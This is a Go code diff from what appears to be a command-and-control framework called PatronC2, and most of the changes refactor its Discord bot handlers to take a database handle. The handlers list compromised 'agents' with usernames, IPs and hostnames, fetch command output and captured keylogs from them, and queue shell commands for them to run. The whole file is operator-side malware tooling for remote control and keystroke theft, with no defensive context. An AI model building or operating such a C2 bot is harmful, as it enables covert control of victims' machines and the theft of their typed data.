@@ -5,6 +5,7 @@ import (
 	"log"
 	"os"
 	"regexp"
+	"database/sql"
 	"strings"
 
 	"github.com/PatronC2/Patron/data"
@@ -47,13 +48,16 @@ func sendAgentMessage(agents string, title string) *discordgo.MessageSend {
 		},
 		},
 	}
+	fmt.Printf("type = %T\n", sendMsg)
+	fmt.Printf("content = %#v\n", sendMsg.Embeds)
 	return sendMsg
 }
 
-func GetBotAgents() *discordgo.MessageSend {
+func GetBotAgents(db *sql.DB) *discordgo.MessageSend {
 	var results strings.Builder
-	for i := range data.Agents() {
-		fmt.Fprintf(&results, "%s %s@%s %s <%s>\n", data.Agents()[i].Uuid, data.Agents()[i].Username, data.Agents()[i].AgentIP, data.Agents()[i].Hostname, data.Agents()[i].Status)
+	// fmt.Println(db)
+	for i := range data.Agents(db) {
+		fmt.Fprintf(&results, "%s %s@%s %s <%s>\n", data.Agents(db)[i].Uuid, data.Agents(db)[i].Username, data.Agents(db)[i].AgentIP, data.Agents(db)[i].Hostname, data.Agents(db)[i].Status)
 	}
 	// fmt.Println(results.String())
 
@@ -70,7 +74,7 @@ func GetBotAgents() *discordgo.MessageSend {
 	}
 }
 
-func GetBotAgent(message string) *discordgo.MessageSend {
+func GetBotAgent(db *sql.DB, message string) *discordgo.MessageSend {
 	botmsg := strings.Split(message, " ")
 
 	if len(botmsg) <= 1 {
@@ -83,14 +87,14 @@ func GetBotAgent(message string) *discordgo.MessageSend {
 		return &discordgo.MessageSend{
 			Content: "Error! Invalid uuid",
 		}
-	} else if data.FetchOneAgent(botmsg[1]).Uuid == "" {
+	} else if data.FetchOneAgent(db, botmsg[1]).Uuid == "" {
 		return &discordgo.MessageSend{
 			Content: "Error! Invalid uuid",
 		}
 	}
 	var results strings.Builder
-	for i := range data.Agent(botmsg[1]) {
-		fmt.Fprintf(&results, "`Command:` %s \n`Output:` %s", data.Agent(botmsg[1])[i].Command, data.Agent(botmsg[1])[i].Output)
+	for i := range data.Agent(db, botmsg[1]) {
+		fmt.Fprintf(&results, "`Command:` %s \n`Output:` %s", data.Agent(db, botmsg[1])[i].Command, data.Agent(db, botmsg[1])[i].Output)
 	}
 	//fmt.Println(results.String())
 
@@ -106,7 +110,7 @@ func GetBotAgent(message string) *discordgo.MessageSend {
 	}
 }
 
-func GetBotKeys(message string) *discordgo.MessageSend {
+func GetBotKeys(db *sql.DB, message string) *discordgo.MessageSend {
 	botmsg := strings.Split(message, " ")
 
 	if len(botmsg) <= 1 {
@@ -119,14 +123,14 @@ func GetBotKeys(message string) *discordgo.MessageSend {
 		return &discordgo.MessageSend{
 			Content: "Error! Invalid uuid",
 		}
-	} else if data.FetchOneAgent(botmsg[1]).Uuid == "" {
+	} else if data.FetchOneAgent(db, botmsg[1]).Uuid == "" {
 		return &discordgo.MessageSend{
 			Content: "Error! Invalid uuid",
 		}
 	}
 
 	var results strings.Builder
-	fmt.Fprintf(&results, "`Keylog:` %s", data.Keylog(botmsg[1])[0].Keys)
+	fmt.Fprintf(&results, "`Keylog:` %s", data.Keylog(db, botmsg[1])[0].Keys)
 	//fmt.Println(results.String())
 
 	// trims charaters
@@ -141,7 +145,7 @@ func GetBotKeys(message string) *discordgo.MessageSend {
 	}
 }
 
-func PostBotCmd(message string) *discordgo.MessageSend {
+func PostBotCmd(db *sql.DB, message string) *discordgo.MessageSend {
 	newCmdID := uuid.New().String()
 	botmsg := strings.Split(message, " ")
 
@@ -155,7 +159,7 @@ func PostBotCmd(message string) *discordgo.MessageSend {
 		return &discordgo.MessageSend{
 			Content: "Error! Invalid uuid",
 		}
-	} else if data.FetchOneAgent(botmsg[1]).Uuid == "" {
+	} else if data.FetchOneAgent(db, botmsg[1]).Uuid == "" {
 		return &discordgo.MessageSend{
 			Content: "Error! Invalid uuid",
 		}
@@ -171,7 +175,7 @@ func PostBotCmd(message string) *discordgo.MessageSend {
 		}
 	}
 
-	data.SendAgentCommand(botmsg[1], "0", "shell", command[1], newCmdID)
+	data.SendAgentCommand(db, botmsg[1], "0", "shell", command[1], newCmdID)
 
 	return &discordgo.MessageSend{
 		Content: "!refresh " + botmsg[1],
